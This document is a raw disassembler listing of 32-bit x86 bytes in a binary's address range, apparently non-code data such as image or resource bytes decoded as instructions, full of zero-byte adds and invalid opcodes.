1100ee49:	add    BYTE PTR [eax],al
1100ee4b:	add    BYTE PTR [edi],al
1100ee4d:	add    BYTE PTR [eax],al
1100ee4f:	add    al,al
1100ee51:	add    BYTE PTR [eax],al
1100ee53:	add    BYTE PTR [ebx],al
1100ee55:	add    BYTE PTR [eax],al
1100ee57:	add    BYTE PTR [eax+0x1000000],al
1100ee5d:	add    BYTE PTR [eax],al
1100ee5f:	add    BYTE PTR [eax+0x1000000],al
1100ee65:	add    BYTE PTR [eax],al
1100ee67:	add    al,al
1100ee69:	add    BYTE PTR [eax],al
1100ee6b:	add    BYTE PTR [ebx],al
1100ee6d:	add    BYTE PTR [eax],al
1100ee6f:	add    al,ah
1100ee71:	add    BYTE PTR [eax],al
1100ee73:	add    BYTE PTR [edi],al
1100ee75:	add    BYTE PTR [eax],al
1100ee77:	add    al,dh
1100ee79:	add    BYTE PTR [eax],al
1100ee7b:	add    BYTE PTR [edi],cl
1100ee7d:	add    BYTE PTR [eax],al
1100ee7f:	add    al,bh
1100ee81:	add    BYTE PTR [eax],al
1100ee83:	add    BYTE PTR [edi],bl
1100ee85:	add    BYTE PTR [eax],al
1100ee87:	add    al,bh
1100ee89:	add    BYTE PTR [eax],al
1100ee8b:	add    BYTE PTR [edi],bl
1100ee8d:	add    BYTE PTR [eax],al
1100ee8f:	add    al,bh
1100ee91:	add    BYTE PTR [eax],al
1100ee93:	add    BYTE PTR [edi],bl
1100ee95:	add    BYTE PTR [eax],al
1100ee97:	add    al,bh
1100ee99:	add    BYTE PTR [eax],al
1100ee9b:	add    BYTE PTR [edi],bl
1100ee9d:	add    BYTE PTR [eax],al
1100ee9f:	add    al,bh
1100eea1:	add    BYTE PTR [eax],al
1100eea3:	add    BYTE PTR [edi],bl
1100eea5:	add    BYTE PTR [eax],al
1100eea7:	add    al,bh
1100eea9:	add    BYTE PTR [eax],al
1100eeab:	add    BYTE PTR [edi],bl
1100eead:	add    BYTE PTR [eax],al
1100eeaf:	add    al,bh
1100eeb1:	add    BYTE PTR [eax],al
1100eeb3:	add    BYTE PTR [edi],bl
1100eeb5:	add    BYTE PTR [eax],al
1100eeb7:	add    al,bh
1100eeb9:	add    BYTE PTR [eax],al
1100eebb:	add    BYTE PTR [edi],bl
1100eebd:	add    BYTE PTR [eax],al
1100eebf:	add    al,bh
1100eec1:	add    BYTE PTR [eax],al
1100eec3:	add    BYTE PTR [edi],bl
1100eec5:	add    BYTE PTR [eax],al
1100eec7:	add    al,bh
1100eec9:	add    BYTE PTR [eax],al
1100eecb:	add    BYTE PTR [edi],bl
1100eecd:	add    BYTE PTR [eax],al
1100eecf:	add    al,bh
1100eed1:	add    BYTE PTR [eax],al
1100eed3:	add    BYTE PTR [edi],bl
1100eed5:	add    BYTE PTR [eax],al
1100eed7:	add    bh,bh
1100eed9:	inc    DWORD PTR [eax]
1100eedb:	(bad)  
1100eedc:	inc    DWORD PTR [eax]
1100eede:	add    BYTE PTR [eax],al
1100eee0:	(bad)  
1100eee1:	inc    DWORD PTR [ecx+0xffff]
1100eee7:	add    bh,bh
1100eee9:	inc    ebx
1100eeeb:	(bad)  
1100eeec:	inc    DWORD PTR [eax]
1100eeee:	add    BYTE PTR [eax],al
1100eef0:	(bad)  
1100eef1:	jmp    edi
1100eef3:	(bad)  
1100eef4:	inc    DWORD PTR [eax]
1100eef6:	add    BYTE PTR [eax],al
1100eef8:	(bad)  
1100eef9:	(bad)  
1100eefa:	(bad)  
1100eefb:	(bad)  
1100eefc:	inc    DWORD PTR [eax]
1100eefe:	add    BYTE PTR [eax],al
1100ef00:	sub    BYTE PTR [eax],al
1100ef02:	add    BYTE PTR [eax],al
1100ef04:	and    BYTE PTR [eax],al
1100ef06:	add    BYTE PTR [eax],al
1100ef08:	inc    eax
1100ef09:	add    BYTE PTR [eax],al
1100ef0b:	add    BYTE PTR [ecx],al
1100ef0d:	add    BYTE PTR [eax+eax*1],al
	...
1100ef2c:	add    BYTE PTR [eax],al
1100ef2e:	add    BYTE PTR [eax],0x0
1100ef31:	add    BYTE PTR [eax],0x0
1100ef34:	add    BYTE PTR [eax+0x800080],al
1100ef3a:	add    BYTE PTR [eax],al
1100ef3c:	add    BYTE PTR [eax],0x80
1100ef3f:	add    BYTE PTR [eax-0x7fffff80],al
1100ef45:	add    BYTE PTR [eax-0x1000000],0x0
1100ef4c:	add    bh,bh
1100ef4e:	add    BYTE PTR [eax],al
1100ef50:	add    bh,bh
1100ef52:	inc    DWORD PTR [eax]
1100ef54:	inc    DWORD PTR [eax]
1100ef56:	add    BYTE PTR [eax],al
1100ef58:	inc    DWORD PTR [eax]
1100ef5a:	inc    DWORD PTR [eax]
1100ef5c:	(bad)  
1100ef5d:	inc    DWORD PTR [eax]
1100ef5f:	add    al,al
1100ef61:	rol    al,0x0
1100ef64:	(bad)  
1100ef65:	(bad)  
1100ef66:	inc    DWORD PTR [eax]
	...
1100ef8c:	add    BYTE PTR [eax],al
1100ef8e:	add    BYTE PTR [esi-0x20],ch
	...
1100ef9d:	add    BYTE PTR [eax],al
1100ef9f:	out    dx,eax
1100efa0:	inc    BYTE PTR [eax+0x0]
	...
1100efab:	inc    eax
1100efac:	inc    esp
1100efad:	add    BYTE PTR [esi-0x1],cl
1100efb0:	jmp    eax
1100efb2:	add    al,0x4
1100efb4:	inc    eax
1100efb5:	add    BYTE PTR [eax],al
1100efb7:	add    BYTE PTR [eax],al
1100efb9:	add    BYTE PTR [edi-0x15],al
1100efbc:	jnp    0x1100f01e
1100efbe:	out    dx,eax
1100efbf:	(bad)  
1100efc0:	(bad)  
1100efc1:	inc    BYTE PTR [esi+0x77]
1100efc4:	mov    esi,0xb4
1100efc9:	add    BYTE PTR [ebx],cl
1100efcb:	in     eax,dx
1100efcc:	ja     0x1100f01c
1100efce:	(bad)  
1100efcf:	(bad)  
1100efd0:	(bad)  
1100efd1:	jmp    esi
1100efd3:	mov    bh,0xd7
1100efd5:	jo     0x1100efd7
1100efd7:	add    BYTE PTR [eax],al
1100efd9:	add    BYTE PTR [edi],al
1100efdb:	(bad)  [edi+ebp*8-0x1]
1100efdf:	(bad)  
1100efe0:	(bad)  
1100efe1:	(bad)  
1100efe2:	inc    BYTE PTR [esi]
1100efe4:	jmp    0x1100efca
1100efe6:	add    BYTE PTR [eax],al
1100efe8:	add    BYTE PTR [eax],al
1100efea:	dec    ebx
1100efeb:	out    0x4e,al
1100efed:	(bad)  
1100efee:	out    dx,al
1100efef:	jmp    0x1100f068
1100eff1:	out    dx,al
1100eff2:	jmp    edx
1100eff4:	pop    ebp
1100eff5:	jo     0x1100eff7
1100eff7:	add    BYTE PTR [eax],al
1100eff9:	add    BYTE PTR [esi],cl
1100effb:	jo     0x1100efec
1100effd:	(bad)  
1100effe:	xlat   BYTE PTR ds:[ebx]
1100efff:	jnp    0x1100efdc
1100f001:	fucomi st,st(7)
1100f003:	inc    BYTE PTR [esi+0x74]
1100f006:	add    BYTE PTR [eax],al
1100f008:	add    BYTE PTR [eax],al
1100f00a:	push   es
1100f00b:	dec    esi
1100f00c:	(bad)  
1100f00d:	jmp    0x1100effa
1100f00f:	jmp    0x1100effc
1100f011:	jmp    0x1100effe
1100f013:	jmp    ebp
1100f015:	pusha  
1100f016:	add    BYTE PTR [eax],al
1100f018:	add    BYTE PTR [eax],al
1100f01a:	add    bh,ch
1100f01c:	(bad)  
1100f01d:	jmp    0x1100f00a
1100f01f:	fstp   TBYTE PTR [ebx+0x7b]
1100f022:	mov    ebx,0xfeff
1100f027:	add    BYTE PTR [eax],al
1100f029:	add    BYTE PTR [esi-0x1],cl
1100f02c:	sti    
1100f02d:	in     eax,dx
1100f02e:	out    0xe7,eax
1100f030:	xlat   BYTE PTR ds:[ebx]
1100f031:	ja     0x1100f00e
1100f033:	jle    0x1100f034
1100f035:	in     al,0x0
1100f037:	add    BYTE PTR [eax],al
1100f039:	add    bh,ch
1100f03b:	(bad)  
1100f03c:	in     eax,dx
1100f03d:	out    0xbe,eax
1100f03f:	mov    ebp,0xbebebdb7
1100f044:	(bad)  
1100f045:	inc    BYTE PTR [eax]
1100f047:	add    BYTE PTR [eax],al
1100f049:	dec    esi
1100f04a:	(bad)  
1100f04b:	(bad)  
1100f04c:	jmp    0x1100f03b
1100f04e:	out    0x7e,eax
1100f050:	out    dx,al
1100f051:	mov    esi,0xffffb7bd
1100f056:	loope  0x1100f058
1100f058:	add    bh,ch
1100f05a:	(bad)  
1100f05b:	push   DWORD PTR [edi-0x22]
1100f05e:	mov    esi,0xb7b7bdd7
1100f063:	mov    bh,0xff
1100f065:	(bad)  
1100f066:	inc    BYTE PTR [eax]
1100f068:	add    bh,ch
1100f06a:	(bad)  
1100f06b:	jmp    edi
1100f06d:	out    dx,al
1100f06e:	out    0xee,eax
1100f070:	jle    0x1100f049
1100f072:	jge    0x1100f0ea
1100f074:	(bad)  
1100f075:	(bad)  
1100f076:	inc    BYTE PTR [eax]
1100f078:	add    BYTE PTR [edi],cl
1100f07a:	(bad)  
1100f07b:	(bad)  
1100f07c:	in     eax,dx
1100f07d:	out    dx,al
1100f07e:	fsubp  st(5),st
1100f080:	mov    esi,0xffbebebe
1100f085:	jmp    esi
1100f087:	add    BYTE PTR [eax],al
1100f089:	add    bh,ch
1100f08b:	(bad)  
1100f08c:	out    dx,al
1100f08d:	out    dx,al
1100f08e:	out    dx,al
1100f08f:	out    dx,al
1100f090:	out    dx,al
1100f091:	fidivr WORD PTR [ebp+0xfeffbe]
1100f097:	add    BYTE PTR [eax],al
1100f099:	add    BYTE PTR [esi],cl
1100f09b:	(bad)  
1100f09c:	(bad)  
1100f09d:	out    dx,eax
1100f09e:	out    dx,al
1100f09f:	in     eax,dx
1100f0a0:	jnp    0x1100f08d
1100f0a2:	in     eax,dx
1100f0a3:	into   
1100f0a4:	jmp    eax
1100f0a6:	add    BYTE PTR [eax],al
1100f0a8:	add    BYTE PTR [eax],al
1100f0aa:	add    bh,ch
1100f0ac:	(bad)  
1100f0ad:	out    dx,al
1100f0ae:	out    dx,al
1100f0af:	out    dx,al
1100f0b0:	in     eax,dx
1100f0b1:	jle    0x1100f070
1100f0b3:	out    dx,eax
1100f0b4:	inc    BYTE PTR [eax]
1100f0b6:	add    BYTE PTR [eax],al
1100f0b8:	add    BYTE PTR [eax],al
1100f0ba:	pop    es
1100f0bb:	outs   dx,BYTE PTR ds:[esi]
1100f0bc:	(bad)  
1100f0bd:	out    dx,eax
1100f0be:	out    dx,al
1100f0bf:	out    dx,al
1100f0c0:	jle    0x1100f0ad
1100f0c2:	out    dx,al
1100f0c3:	out    dx,eax
1100f0c4:	in     al,0x74
1100f0c6:	add    BYTE PTR [eax],al
1100f0c8:	add    BYTE PTR [eax],al
1100f0ca:	dec    ebx
1100f0cb:	jo     0x1100f0bc
1100f0cd:	(bad)  
1100f0ce:	out    dx,al
1100f0cf:	fidivr WORD PTR [ebp+0x46feef7d]
1100f0d5:	jo     0x1100f0d7
1100f0d7:	add    BYTE PTR [eax],al
1100f0d9:	add    BYTE PTR [esi],cl
1100f0db:	aad    0x4e
1100f0dd:	(bad)  
1100f0de:	(bad)  
1100f0df:	out    dx,al
1100f0e0:	out    dx,al
1100f0e1:	out    dx,eax
1100f0e2:	jmp    eax
1100f0e4:	jle    0x1100f09a
1100f0e6:	add    BYTE PTR [eax],al
1100f0e8:	add    BYTE PTR [eax],al
1100f0ea:	dec    ebx
1100f0eb:	jge    0x1100f15d
1100f0ed:	out    dx,eax
1100f0ee:	(bad)  
1100f0ef:	(bad)  
1100f0f0:	(bad)  
1100f0f1:	(bad)  
1100f0f2:	(bad)  
1100f0f3:	jnp    0x1100f152
1100f0f5:	jo     0x1100f0f7
1100f0f7:	add    BYTE PTR [eax],al
1100f0f9:	add    BYTE PTR [edi],al
1100f0fb:	jmp    0x1100f0e8
1100f0fd:	dec    esi
1100f0fe:	(bad)  
1100f0ff:	(bad)  
1100f100:	(bad)  
1100f101:	jmp    ecx
1100f103:	imul   ebp,ebp,0x74
1100f106:	add    BYTE PTR [eax],al
1100f108:	add    BYTE PTR [eax],al
1100f10a:	inc    esi
1100f10b:	ja     0x1100f0e4
1100f10d:	jo     0x1100f0fe
1100f10f:	(bad)  
1100f110:	(bad)  
1100f111:	inc    BYTE PTR [esi-0x1a]
1100f114:	jmp    0x1100f186
1100f116:	add    BYTE PTR [eax],al
1100f118:	add    BYTE PTR [eax],al
1100f11a:	add    BYTE PTR [eax+eax*1],al
1100f11d:	add    BYTE PTR [esi],cl
1100f11f:	(bad)  
1100f120:	jmp    eax
1100f122:	add    BYTE PTR [eax+eax*1],al
	...
1100f12d:	add    BYTE PTR [eax],al
1100f12f:	out    dx,eax
1100f130:	inc    BYTE PTR [eax]
	...
1100f13e:	add    BYTE PTR [esi],cl
1100f140:	out    0x0,eax
	...
1100f166:	add    BYTE PTR [eax],al
1100f168:	(bad)  
1100f169:	(bad)  
1100f16a:	(bad)  
1100f16b:	(bad)  
1100f16c:	(bad)  
1100f16d:	(bad)  
1100f16e:	jg     0x1100f16f
1100f170:	(bad)  
1100f171:	cld    
1100f172:	aas    
1100f173:	(bad)  
1100f174:	(bad)  
1100f175:	clc    
1100f176:	pop    ds
1100f177:	push   eax
1100f179:	add    BYTE PTR [eax],al
1100f17b:	(bad)  
1100f17d:	add    BYTE PTR [eax],al
1100f17f:	(bad)  
1100f181:	add    BYTE PTR [eax],al
1100f183:	(bad)  
1100f185:	add    BYTE PTR [eax],al
1100f187:	(bad)  
1100f189:	add    BYTE PTR [eax],al
1100f18b:	(bad)  
1100f18d:	add    BYTE PTR [eax],al
1100f18f:	(bad)  
1100f191:	add    BYTE PTR [eax],al
1100f193:	(bad)  
1100f195:	add    BYTE PTR [eax],al
1100f197:	(bad)  
1100f199:	add    BYTE PTR [eax],al
1100f19b:	pavgb  mm0,QWORD PTR [eax]
1100f19e:	add    BYTE PTR [edi],al
1100f1a0:	rol    BYTE PTR [eax],0x0
1100f1a3:	add    eax,DWORD PTR [eax-0x7fff0000]
1100f1a9:	add    BYTE PTR [eax],al
1100f1ab:	add    eax,eax
1100f1ad:	add    BYTE PTR [eax],al
1100f1af:	add    esp,eax
1100f1b1:	add    BYTE PTR [eax],al
1100f1b3:	pop    es
1100f1b4:	lock add BYTE PTR [eax],al
1100f1b7:	(bad)  
1100f1b9:	add    BYTE PTR [eax],al
1100f1bb:	(bad)  
1100f1bd:	add    BYTE PTR [eax],al
1100f1bf:	(bad)  
1100f1c1:	add    BYTE PTR [eax],al
1100f1c3:	(bad)  
1100f1c5:	add    BYTE PTR [eax],al
1100f1c7:	(bad)  
1100f1c9:	add    BYTE PTR [eax],al
1100f1cb:	(bad)  
1100f1cd:	add    BYTE PTR [eax],al
1100f1cf:	(bad)  
1100f1d1:	add    BYTE PTR [eax],al
1100f1d3:	(bad)  
1100f1d5:	add    BYTE PTR [eax],al
1100f1d7:	ud0    edi,eax
1100f1da:	pop    ds
1100f1db:	(bad)  
1100f1dc:	(bad)  
1100f1dd:	cld    
1100f1de:	aas    
1100f1df:	(bad)  
1100f1e0:	(bad)  
1100f1e1:	(bad)  
1100f1e2:	jg     0x1100f1e3
1100f1e4:	(bad)  
1100f1e5:	(bad)  
1100f1e6:	(bad)  
1100f1e7:	jmp    FWORD PTR [eax]
1100f1e9:	add    BYTE PTR [eax],al
1100f1eb:	add    BYTE PTR [eax],bl
1100f1ed:	add    BYTE PTR [eax],al
1100f1ef:	add    BYTE PTR [eax],dh
1100f1f1:	add    BYTE PTR [eax],al
1100f1f3:	add    BYTE PTR [ecx],al
1100f1f5:	add    BYTE PTR [eax+eax*1],al
	...
1100f214:	add    BYTE PTR [eax],al
1100f216:	add    BYTE PTR [eax],0x0
1100f219:	add    BYTE PTR [eax],0x0
1100f21c:	add    BYTE PTR [eax+0x800080],al
1100f222:	add    BYTE PTR [eax],al
1100f224:	add    BYTE PTR [eax],0x80
1100f227:	add    BYTE PTR [eax-0x7fffff80],al
1100f22d:	add    BYTE PTR [eax-0x1000000],0x0
1100f234:	add    bh,bh
1100f236:	add    BYTE PTR [eax],al
1100f238:	add    bh,bh
1100f23a:	inc    DWORD PTR [eax]
1100f23c:	inc    DWORD PTR [eax]
1100f23e:	add    BYTE PTR [eax],al
1100f240:	inc    DWORD PTR [eax]
1100f242:	inc    DWORD PTR [eax]
1100f244:	(bad)  
1100f245:	inc    DWORD PTR [eax]
1100f247:	add    al,al
1100f249:	rol    al,0x0
1100f24c:	(bad)  
1100f24d:	(bad)  
1100f24e:	inc    DWORD PTR [eax]
	...
1100f260:	add    BYTE PTR [edi],al
	...
1100f26a:	add    BYTE PTR [eax],al
1100f26c:	add    BYTE PTR [edi-0x19],bh
1100f26f:	add    BYTE PTR [eax],al
1100f271:	add    BYTE PTR [eax],al
1100f273:	add    BYTE PTR [eax],al
1100f275:	add    BYTE PTR [edx+0x46],al
1100f278:	add    eax,0x660ffef
1100f27d:	push   es
1100f27e:	add    BYTE PTR [eax],al
1100f280:	add    BYTE PTR [esi],al
1100f282:	mov    esi,0xffff6fb7
1100f287:	idiv   DWORD PTR [esi+0x40be]
1100f28d:	add    dh,ch
1100f28f:	gs (bad) 
1100f291:	(bad)  
1100f292:	(bad)  
1100f293:	inc    DWORD PTR [edi+0x7d]
1100f296:	inc    eax
1100f297:	add    BYTE PTR [eax],al
1100f299:	add    BYTE PTR [esi-0x411101a1],dh
1100f29f:	out    dx,eax
1100f2a0:	repz mov bh,0x0
1100f2a3:	add    BYTE PTR [eax],al
1100f2a5:	add    al,0x77
1100f2a7:	(bad)  
1100f2a8:	fucomi st,st(3)
1100f2aa:	fcmovnu st,st(3)
1100f2ac:	jmp    DWORD PTR [edi+0x40]
1100f2af:	add    BYTE PTR [eax],al
1100f2b1:	add    BYTE PTR [edi-0x2],cl
1100f2b4:	jmp    0x1100f2a1
1100f2b6:	jmp    0x1100f2a3
1100f2b8:	jg     0x1100f2a1
1100f2ba:	add    BYTE PTR [eax],al
1100f2bc:	add    BYTE PTR [edx],al
1100f2be:	(bad)  
1100f2bf:	jmp    0x1100f2ac
1100f2c1:	in     eax,dx
1100f2c2:	mov    bh,0xb7
1100f2c4:	mov    esi,0x70ff
1100f2c9:	jg     0x1100f2ca
1100f2cb:	in     eax,dx
1100f2cc:	jmp    0x1100f2b5
1100f2ce:	fidivr WORD PTR [ebp+0xf0ffbe]
1100f2d4:	pop    es
1100f2d5:	(bad)  
1100f2d6:	(bad)  
1100f2d7:	jge    0x1100f2a6
1100f2d9:	jmp    0x1100f2c6
1100f2db:	jnp    0x1100f2c8
1100f2dd:	(bad)  
1100f2de:	jmp    DWORD PTR [eax+0x0]
1100f2e1:	(bad)  
1100f2e2:	(bad)  
1100f2e3:	in     eax,dx
1100f2e4:	out    dx,al
1100f2e5:	out    0xed,eax
1100f2e7:	jmp    0x1100f2a0
1100f2e9:	(bad)  
1100f2ea:	push   DWORD PTR [eax+0x0]
1100f2ed:	jg     0x1100f2ee
1100f2ef:	out    dx,al
1100f2f0:	out    dx,al
1100f2f1:	(bad)  
1100f2f3:	mov    esi,0xf1ffde
1100f2f8:	add    BYTE PTR [edi+edi*8],al
1100f2fb:	(bad)  
1100f2fc:	out    dx,al
1100f2fd:	out    dx,al
1100f2fe:	out    dx,al
1100f2ff:	mov    esi,0x20ffbe
1100f304:	add    BYTE PTR [eax],al
1100f306:	jg     0x1100f306
1100f308:	out    dx,al
1100f309:	out    dx,al
1100f30a:	mov    ebp,0xf6ee7d
1100f30f:	add    BYTE PTR [eax],al
1100f311:	add    al,0x64
1100f313:	(bad)  
1100f314:	out    dx,al
1100f315:	out    dx,al
1100f316:	out    dx,al
1100f317:	mov    esi,0x4056ff
1100f31c:	add    BYTE PTR [eax],al
1100f31e:	out    0x7f,eax
1100f320:	(bad)  
1100f321:	out    dx,al
1100f322:	fsubp  st(7),st
1100f324:	imul   DWORD PTR [esi+0x40]
1100f327:	add    BYTE PTR [eax],al
1100f329:	add    al,0xb7
1100f32b:	popa   
1100f32c:	(bad)  
1100f32d:	(bad)  
1100f32e:	(bad)  
1100f32f:	inc    DWORD PTR [edi-0x42]
1100f332:	add    BYTE PTR [eax],al
1100f334:	add    BYTE PTR [ebp*8-0x801a],al
1100f33b:	lock jle 0x1100f31c
1100f33e:	inc    eax
1100f33f:	add    BYTE PTR [eax],al
1100f341:	add    BYTE PTR [esp+eax*1],al
1100f344:	add    bh,bh
1100f346:	push   DWORD PTR [eax+0x4]
1100f349:	add    al,0x0
1100f34b:	add    BYTE PTR [eax],al
1100f34d:	add    BYTE PTR [eax],al
1100f34f:	add    BYTE PTR [eax],al
1100f351:	jg     0x1100f347
	...
1100f35b:	add    BYTE PTR [eax],al
1100f35d:	add    BYTE PTR [eax+0x0],dh
	...
1100f370:	(bad)  
1100f371:	(bad)  
1100f372:	(bad)  
1100f373:	(bad)  
1100f374:	jmp    edi
1100f376:	(bad)  
1100f377:	(bad)  
1100f378:	inc    ebx
1100f37a:	(bad)  
1100f37b:	jmp    eax
1100f37d:	add    BYTE PTR [edi],al
1100f37f:	jmp    eax
1100f381:	add    BYTE PTR [edi],al
1100f383:	jmp    eax
1100f385:	add    BYTE PTR [edi],al
1100f387:	jmp    eax
1100f389:	add    BYTE PTR [edi],al
1100f38b:	jmp    eax
1100f38d:	add    BYTE PTR [edi],al
1100f38f:	jmp    eax
1100f391:	add    BYTE PTR [edi],al
1100f393:	jmp    eax
1100f395:	add    BYTE PTR [edi],al
1100f397:	inc    eax
1100f399:	add    BYTE PTR [ebx],al
1100f39b:	inc    DWORD PTR [eax-0x7f00ff00]
1100f3a1:	add    BYTE PTR [ecx],al
1100f3a3:	inc    eax
1100f3a5:	add    BYTE PTR [ebx],al
1100f3a7:	jmp    eax
1100f3a9:	add    BYTE PTR [edi],al
1100f3ab:	jmp    eax
1100f3ad:	add    BYTE PTR [edi],al
1100f3af:	jmp    eax
1100f3b1:	add    BYTE PTR [edi],al
1100f3b3:	jmp    eax
1100f3b5:	add    BYTE PTR [edi],al
1100f3b7:	jmp    eax
1100f3b9:	add    BYTE PTR [edi],al
1100f3bb:	jmp    eax
1100f3bd:	add    BYTE PTR [edi],al
1100f3bf:	jmp    eax
1100f3c1:	add    BYTE PTR [edi],al
1100f3c3:	(bad)  
1100f3c4:	inc    ebx
1100f3c6:	(bad)  
1100f3c7:	(bad)  
1100f3c8:	jmp    edi
1100f3ca:	(bad)  
1100f3cb:	(bad)  
1100f3cc:	(bad)  
1100f3cd:	(bad)  
1100f3ce:	(bad)  
1100f3cf:	jmp    FWORD PTR [eax]
1100f3d1:	add    BYTE PTR [eax],al
1100f3d3:	add    BYTE PTR [eax],dl
1100f3d5:	add    BYTE PTR [eax],al
1100f3d7:	add    BYTE PTR [eax],ah
1100f3d9:	add    BYTE PTR [eax],al
1100f3db:	add    BYTE PTR [ecx],al
1100f3dd:	add    BYTE PTR [eax+eax*1],al
	...
1100f3fc:	add    BYTE PTR [eax],al
1100f3fe:	add    BYTE PTR [eax],0x0
1100f401:	add    BYTE PTR [eax],0x0
1100f404:	add    BYTE PTR [eax+0x800080],al
1100f40a:	add    BYTE PTR [eax],al
1100f40c:	add    BYTE PTR [eax],0x80
1100f40f:	add    BYTE PTR [eax-0x7fffff80],al
1100f415:	add    BYTE PTR [eax-0x1000000],0x0
1100f41c:	add    bh,bh
1100f41e:	add    BYTE PTR [eax],al
1100f420:	add    bh,bh
1100f422:	inc    DWORD PTR [eax]
1100f424:	inc    DWORD PTR [eax]
1100f426:	add    BYTE PTR [eax],al
1100f428:	inc    DWORD PTR [eax]
1100f42a:	inc    DWORD PTR [eax]
1100f42c:	(bad)  
1100f42d:	inc    DWORD PTR [eax]
1100f42f:	add    al,al
1100f431:	rol    al,0x0
1100f434:	(bad)  
1100f435:	(bad)  
1100f436:	inc    DWORD PTR [eax]
1100f438:	add    BYTE PTR [eax],al
1100f43a:	add    BYTE PTR [esi],cl
1100f43c:	jo     0x1100f43e
1100f43e:	add    BYTE PTR [eax],al
1100f440:	add    BYTE PTR [eax],al
1100f442:	add    dh,ch
1100f444:	jle    0x1100f446
1100f446:	add    BYTE PTR [eax],al
1100f448:	add    BYTE PTR ds:0x46fe7f64,al
1100f44e:	inc    esp
1100f44f:	add    BYTE PTR [eax],al
1100f451:	outs   dx,BYTE PTR ds:[esi]
1100f452:	mov    esi,0xe4e4ffff
1100f457:	add    BYTE PTR [eax],al
1100f459:	inc    esi
1100f45a:	out    dx,eax
1100f45b:	out    dx,al
1100f45c:	mov    bh,0xf7
1100f45e:	jbe    0x1100f460
1100f460:	add    BYTE PTR [esi-0x5],cl
1100f463:	fucomi st,st(3)
1100f465:	(bad)  
1100f467:	add    BYTE PTR [edi],al
1100f469:	out    dx,al
1100f46a:	out    dx,al
1100f46b:	in     eax,dx
1100f46c:	mov    esi,0xeee0f7be
1100f471:	(bad)  
1100f472:	in     eax,dx
1100f473:	mov    esi,0xe7ffb7be
1100f478:	jle    0x1100f479
1100f47a:	out    dx,al
1100f47b:	out    dx,al
1100f47c:	xlat   BYTE PTR ds:[ebx]
1100f47d:	jnp    0x1100f47e
1100f47f:	jle    0x1100f48f
1100f481:	jg     0x1100f471
1100f483:	out    dx,al
1100f484:	jmp    0x1100f473
1100f486:	(bad)  
1100f487:	loopne 0x1100f489
1100f489:	inc    edi
1100f48a:	(bad)  
1100f48b:	in     eax,dx
1100f48c:	jmp    0x1100f47d
1100f48e:	loopne 0x1100f490
1100f490:	add    BYTE PTR [edi-0x12],ah
1100f493:	out    dx,al
1100f494:	out    dx,al
1100f495:	div    DWORD PTR [esi+0x6e4e0000]
1100f49b:	(bad)  
1100f49c:	jmp    esi
1100f49e:	out    0x0,al
1100f4a0:	add    BYTE PTR [esi],al
1100f4a2:	push   eax
1100f4a3:	out    dx,eax
1100f4a4:	test   DWORD PTR [esi],0x50
1100f4aa:	add    BYTE PTR [esi-0x12],bh
1100f4ad:	add    BYTE PTR [eax],al
1100f4af:	add    BYTE PTR [eax],al
1100f4b1:	add    BYTE PTR [eax],al
1100f4b3:	push   cs
1100f4b4:	jo     0x1100f4b6
1100f4b6:	add    BYTE PTR [eax],al
1100f4b8:	(bad)  
1100f4b9:	jg     0x1100f4ba
1100f4bb:	(bad)  
1100f4bc:	cld    
1100f4bd:	aas    
1100f4be:	(bad)  
1100f4bf:	inc    eax
1100f4c1:	add    edi,edi
1100f4c3:	inc    eax
1100f4c5:	add    edi,edi
1100f4c7:	inc    eax
1100f4c9:	add    edi,edi
1100f4cb:	inc    eax
1100f4cd:	add    edi,edi
1100f4cf:	inc    DWORD PTR [eax+0xffff01]
1100f4d5:	add    bh,bh
1100f4d7:	inc    DWORD PTR [eax]
1100f4d9:	add    bh,bh
1100f4db:	inc    DWORD PTR [eax-0x3f0000ff]
1100f4e1:	add    edi,edi
1100f4e3:	inc    eax
1100f4e5:	add    edi,edi
1100f4e7:	inc    eax
1100f4e9:	add    edi,edi
1100f4eb:	inc    eax
1100f4ed:	add    edi,edi
1100f4ef:	(bad)  
1100f4f0:	cld    
1100f4f1:	aas    
1100f4f2:	(bad)  
1100f4f3:	(bad)  
1100f4f4:	(bad)  
1100f4f5:	jg     0x1100f4f6
1100f4f7:	jmp    FWORD PTR [eax]
1100f4f9:	add    BYTE PTR [eax],al
1100f4fb:	add    BYTE PTR [eax],dh
1100f4fd:	add    BYTE PTR [eax],al
1100f4ff:	add    BYTE PTR [eax+0x0],ah
1100f502:	add    BYTE PTR [eax],al
1100f504:	add    DWORD PTR [eax],eax
1100f506:	or     BYTE PTR [eax],al
	...
1100f524:	add    al,0x2
1100f526:	add    DWORD PTR [eax],eax
1100f528:	add    al,0x4
1100f52a:	add    al,0x0
1100f52c:	or     BYTE PTR [eax],cl
1100f52e:	or     BYTE PTR [eax],al
1100f530:	or     eax,0x11000d0d
1100f535:	or     DWORD PTR [esi],eax
1100f537:	add    BYTE PTR [edx],dl
1100f539:	adc    dl,BYTE PTR [edx]
1100f53b:	add    BYTE PTR [esp+edx*1],dl
1100f53e:	adc    al,0x0
1100f540:	sbb    DWORD PTR [ecx],ebx
1100f542:	sbb    DWORD PTR [eax],eax
1100f544:	sbb    eax,0x27001d1d
1100f549:	push   ss
1100f54a:	push   cs
1100f54b:	add    BYTE PTR [eax],ch
1100f54d:	push   ss
1100f54e:	push   cs
1100f54f:	add    BYTE PTR [esi],ch
1100f551:	sbb    dl,BYTE PTR [ecx]
1100f553:	add    BYTE PTR ds:0x25001622,bh
1100f559:	and    eax,0x2c2c0025
1100f55e:	sub    al,0x0
1100f560:	xor    DWORD PTR [ecx],esi
1100f562:	xor    DWORD PTR [eax],eax
1100f564:	cmp    BYTE PTR [eax],bh
1100f566:	cmp    BYTE PTR [eax],al
1100f568:	ds ds add BYTE PTR ds:[ebp+0x27],al
1100f56e:	sbb    DWORD PTR [eax],eax
1100f570:	push   ebx
1100f571:	das    
1100f572:	pop    ds
1100f573:	add    BYTE PTR [edx+0x33],bl
1100f576:	and    DWORD PTR [eax],eax
1100f578:	cmp    DWORD PTR gs:0x2a3f7000,esp
1100f57f:	add    BYTE PTR [edx+0x40],dh
1100f582:	sub    al,BYTE PTR [eax]
1100f584:	jbe    0x1100f5c9
1100f586:	sub    al,0x0
1100f588:	jns    0x1100f5ce
1100f58a:	sub    eax,0x40404000
1100f58f:	add    BYTE PTR [ebp+0x45],al
1100f592:	inc    ebp
1100f593:	add    BYTE PTR [eax+0x48],cl
1100f596:	dec    eax
1100f597:	add    BYTE PTR [ebx+0x53],dl
1100f59a:	push   ebx
1100f59b:	add    BYTE PTR [edi+0x57],dl
1100f59e:	push   edi
1100f59f:	add    BYTE PTR [ebp+0x5d],bl
1100f5a2:	pop    ebp
